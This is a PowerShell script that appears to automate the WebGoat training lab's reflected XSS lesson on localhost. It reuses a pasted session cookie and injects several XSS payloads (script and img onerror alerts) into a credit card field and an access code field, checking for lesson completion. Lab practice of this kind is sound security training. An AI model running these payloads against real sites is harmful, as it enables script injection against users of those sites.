# Reflected XSS - Field Vulnerability Tester

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "Reflected XSS Field Tester" -ForegroundColor Yellow
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "Get your JSESSIONID from browser console: document.cookie" -ForegroundColor White
Write-Host ""
$rawInput = Read-Host "Paste JSESSIONID value"

# Clean up the input
$webgoatSessionId = $rawInput -replace '"', '' -replace "'", '' -replace 'JSESSIONID=', '' -replace 'JSESSIONID:', '' -replace '\s', ''

if ([string]::IsNullOrWhiteSpace($webgoatSessionId)) {
    Write-Host "No session ID provided. Exiting." -ForegroundColor Red
    exit 1
}

Write-Host ""
Write-Host "Using session: $webgoatSessionId" -ForegroundColor Green
Write-Host ""

# Create web session with cookie
$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$cookie = New-Object System.Net.Cookie("JSESSIONID", $webgoatSessionId, "/", "localhost")
$session.Cookies.Add("http://localhost:8001", $cookie)

$submitUrl = "http://localhost:8001/WebGoat/CrossSiteScripting/attack5a"

# XSS payloads to test
$xssPayloads = @(
    "<script>alert('XSS')</script>",
    "<script>console.log('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "7<script>alert('XSS')</script>"
)

Write-Host "Testing XSS payloads on different fields..." -ForegroundColor Cyan
Write-Host ""

foreach ($payload in $xssPayloads) {
    Write-Host "=== Testing payload: $payload ===" -ForegroundColor Yellow
    
    # Test 1: XSS in credit card field
    Write-Host "  [1/2] Testing credit card field..." -ForegroundColor Gray
    try {
        $body = "field1=$([System.Web.HttpUtility]::UrlEncode($payload))&field2=123"
        $response = Invoke-WebRequest -Uri $submitUrl -Method POST -WebSession $session -ContentType "application/x-www-form-urlencoded; charset=UTF-8" -Body $body -UseBasicParsing -ErrorAction Stop
        
        if ($response.Content -match [regex]::Escape($payload) -or $response.Content -match "script" -or $response.Content -match "lessonCompleted") {
            try {
                $jsonResponse = $response.Content | ConvertFrom-Json
                if ($jsonResponse.lessonCompleted -eq $true) {
                    Write-Host "    SUCCESS! Credit card field is vulnerable!" -ForegroundColor Green
                    Write-Host "    Response: $($response.Content)" -ForegroundColor Cyan
                    exit 0
                }
            }
            catch {
                Write-Host "    Payload reflected but lesson not completed" -ForegroundColor Yellow
            }
        }
    }
    catch {
        if ($_.Exception.Message -match "401") {
            Write-Host "    SESSION EXPIRED!" -ForegroundColor Red
            exit 1
        }
        Write-Host "    Error: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    # Test 2: XSS in access code field
    Write-Host "  [2/2] Testing access code field..." -ForegroundColor Gray
    try {
        $body = "field1=1234567890123456&field2=$([System.Web.HttpUtility]::UrlEncode($payload))"
        $response = Invoke-WebRequest -Uri $submitUrl -Method POST -WebSession $session -ContentType "application/x-www-form-urlencoded; charset=UTF-8" -Body $body -UseBasicParsing -ErrorAction Stop
        
        if ($response.Content -match [regex]::Escape($payload) -or $response.Content -match "script" -or $response.Content -match "lessonCompleted") {
            try {
                $jsonResponse = $response.Content | ConvertFrom-Json
                if ($jsonResponse.lessonCompleted -eq $true) {
                    Write-Host "    SUCCESS! Access code field is vulnerable!" -ForegroundColor Green
                    Write-Host "    Response: $($response.Content)" -ForegroundColor Cyan
                    exit 0
                }
            }
            catch {
                Write-Host "    Payload reflected but lesson not completed" -ForegroundColor Yellow
            }
        }
    }
    catch {
        if ($_.Exception.Message -match "401") {
            Write-Host "    SESSION EXPIRED!" -ForegroundColor Red
            exit 1
        }
        Write-Host "    Error: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    Write-Host ""
}

Write-Host "Testing complete. Check the responses above for clues." -ForegroundColor Yellow
